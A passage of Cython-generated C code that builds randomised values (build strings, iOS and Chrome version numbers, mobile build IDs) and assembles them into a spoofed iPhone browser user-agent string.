        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_4, __pyx_kp_s_Build) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_s_Build);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_dev, __pyx_t_1) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_az, __pyx_tuple__79) < 0) __PYX_ERR(0, 24, __pyx_L1_error)

    
    __pyx_t_1 = PyTuple_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_6 = 0;
    __pyx_t_7 = 127;
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_az); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_2 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_8, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_5);
    __pyx_t_5 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_az); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_8, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_az); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_t_2);
    __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__80, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_az); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_8, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_t_5);
    __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_1, 5, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_build, __pyx_t_5) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 26, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyList_New(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_INCREF(__pyx_kp_s_10_0_2);
    __Pyx_GIVEREF(__pyx_kp_s_10_0_2);
    PyList_SET_ITEM(__pyx_t_1, 0, __pyx_kp_s_10_0_2);
    __Pyx_INCREF(__pyx_kp_s_10_1_1);
    __Pyx_GIVEREF(__pyx_kp_s_10_1_1);
    PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_s_10_1_1);
    __Pyx_INCREF(__pyx_kp_s_10_2);
    __Pyx_GIVEREF(__pyx_kp_s_10_2);
    PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_s_10_2);
    __Pyx_INCREF(__pyx_kp_s_10_2_1);
    __Pyx_GIVEREF(__pyx_kp_s_10_2_1);
    PyList_SET_ITEM(__pyx_t_1, 3, __pyx_kp_s_10_2_1);
    __Pyx_INCREF(__pyx_kp_s_10_3_1);
    __Pyx_GIVEREF(__pyx_kp_s_10_3_1);
    PyList_SET_ITEM(__pyx_t_1, 4, __pyx_kp_s_10_3_1);
    __Pyx_INCREF(__pyx_kp_s_10_3_2);
    __Pyx_GIVEREF(__pyx_kp_s_10_3_2);
    PyList_SET_ITEM(__pyx_t_1, 5, __pyx_kp_s_10_3_2);
    __Pyx_INCREF(__pyx_kp_s_10_3_3);
    __Pyx_GIVEREF(__pyx_kp_s_10_3_3);
    PyList_SET_ITEM(__pyx_t_1, 6, __pyx_kp_s_10_3_3);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_5 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 26, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_versi, __pyx_t_5) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = PyList_New(8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_INCREF(__pyx_kp_s_602_1_50);
    __Pyx_GIVEREF(__pyx_kp_s_602_1_50);
    PyList_SET_ITEM(__pyx_t_4, 0, __pyx_kp_s_602_1_50);
    __Pyx_INCREF(__pyx_kp_s_602_2_14);
    __Pyx_GIVEREF(__pyx_kp_s_602_2_14);
    PyList_SET_ITEM(__pyx_t_4, 1, __pyx_kp_s_602_2_14);
    __Pyx_INCREF(__pyx_kp_s_602_3_12);
    __Pyx_GIVEREF(__pyx_kp_s_602_3_12);
    PyList_SET_ITEM(__pyx_t_4, 2, __pyx_kp_s_602_3_12);
    __Pyx_INCREF(__pyx_kp_s_602_4_6);
    __Pyx_GIVEREF(__pyx_kp_s_602_4_6);
    PyList_SET_ITEM(__pyx_t_4, 3, __pyx_kp_s_602_4_6);
    __Pyx_INCREF(__pyx_kp_s_603_1_30);
    __Pyx_GIVEREF(__pyx_kp_s_603_1_30);
    PyList_SET_ITEM(__pyx_t_4, 4, __pyx_kp_s_603_1_30);
    __Pyx_INCREF(__pyx_kp_s_603_2_4);
    __Pyx_GIVEREF(__pyx_kp_s_603_2_4);
    PyList_SET_ITEM(__pyx_t_4, 5, __pyx_kp_s_603_2_4);
    __Pyx_INCREF(__pyx_kp_s_603_3_8);
    __Pyx_GIVEREF(__pyx_kp_s_603_3_8);
    PyList_SET_ITEM(__pyx_t_4, 6, __pyx_kp_s_603_3_8);
    __Pyx_INCREF(__pyx_kp_s_601_1_46);
    __Pyx_GIVEREF(__pyx_kp_s_601_1_46);
    PyList_SET_ITEM(__pyx_t_4, 7, __pyx_kp_s_601_1_46);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_5 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_verchrome, __pyx_t_5) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyList_New(14); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_INCREF(__pyx_kp_s_14A456);
    __Pyx_GIVEREF(__pyx_kp_s_14A456);
    PyList_SET_ITEM(__pyx_t_1, 0, __pyx_kp_s_14A456);
    __Pyx_INCREF(__pyx_kp_s_14B100);
    __Pyx_GIVEREF(__pyx_kp_s_14B100);
    PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_s_14B100);
    __Pyx_INCREF(__pyx_kp_s_14C92);
    __Pyx_GIVEREF(__pyx_kp_s_14C92);
    PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_s_14C92);
    __Pyx_INCREF(__pyx_kp_s_14D27);
    __Pyx_GIVEREF(__pyx_kp_s_14D27);
    PyList_SET_ITEM(__pyx_t_1, 3, __pyx_kp_s_14D27);
    __Pyx_INCREF(__pyx_kp_s_14E304);
    __Pyx_GIVEREF(__pyx_kp_s_14E304);
    PyList_SET_ITEM(__pyx_t_1, 4, __pyx_kp_s_14E304);
    __Pyx_INCREF(__pyx_kp_s_14F89);
    __Pyx_GIVEREF(__pyx_kp_s_14F89);
    PyList_SET_ITEM(__pyx_t_1, 5, __pyx_kp_s_14F89);
    __Pyx_INCREF(__pyx_kp_s_14G60);
    __Pyx_GIVEREF(__pyx_kp_s_14G60);
    PyList_SET_ITEM(__pyx_t_1, 6, __pyx_kp_s_14G60);
    __Pyx_INCREF(__pyx_kp_s_13C75);
    __Pyx_GIVEREF(__pyx_kp_s_13C75);
    PyList_SET_ITEM(__pyx_t_1, 7, __pyx_kp_s_13C75);
    __Pyx_INCREF(__pyx_kp_s_13D15);
    __Pyx_GIVEREF(__pyx_kp_s_13D15);
    PyList_SET_ITEM(__pyx_t_1, 8, __pyx_kp_s_13D15);
    __Pyx_INCREF(__pyx_kp_s_13E233);
    __Pyx_GIVEREF(__pyx_kp_s_13E233);
    PyList_SET_ITEM(__pyx_t_1, 9, __pyx_kp_s_13E233);
    __Pyx_INCREF(__pyx_kp_s_13E238);
    __Pyx_GIVEREF(__pyx_kp_s_13E238);
    PyList_SET_ITEM(__pyx_t_1, 10, __pyx_kp_s_13E238);
    __Pyx_INCREF(__pyx_kp_s_13F69);
    __Pyx_GIVEREF(__pyx_kp_s_13F69);
    PyList_SET_ITEM(__pyx_t_1, 11, __pyx_kp_s_13F69);
    __Pyx_INCREF(__pyx_kp_s_13G34);
    __Pyx_GIVEREF(__pyx_kp_s_13G34);
    PyList_SET_ITEM(__pyx_t_1, 12, __pyx_kp_s_13G34);
    __Pyx_INCREF(__pyx_kp_s_13G36);
    __Pyx_GIVEREF(__pyx_kp_s_13G36);
    PyList_SET_ITEM(__pyx_t_1, 13, __pyx_kp_s_13G36);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_5 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_mob, __pyx_t_5) < 0) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = PyTuple_New(11); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = 0;
    __pyx_t_7 = 127;
    __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_iPhone_CPU_iPhone_OS);
    __pyx_t_6 += 35;
    __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_iPhone_CPU_iPhone_OS);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_Mozilla_5_0_iPhone_CPU_iPhone_OS);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_versi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_INCREF(__pyx_kp_u_like_Mac_OS_X_AppleWebKit);
    __pyx_t_6 += 28;
    __Pyx_GIVEREF(__pyx_kp_u_like_Mac_OS_X_AppleWebKit);
    PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_like_Mac_OS_X_AppleWebKit);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_verchrome); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_INCREF(__pyx_kp_u_KHTML_like_Gecko_Mobile);
    __pyx_t_6 += 28;
    __Pyx_GIVEREF(__pyx_kp_u_KHTML_like_Gecko_Mobile);
    PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u_KHTML_like_Gecko_Mobile);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_mob); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
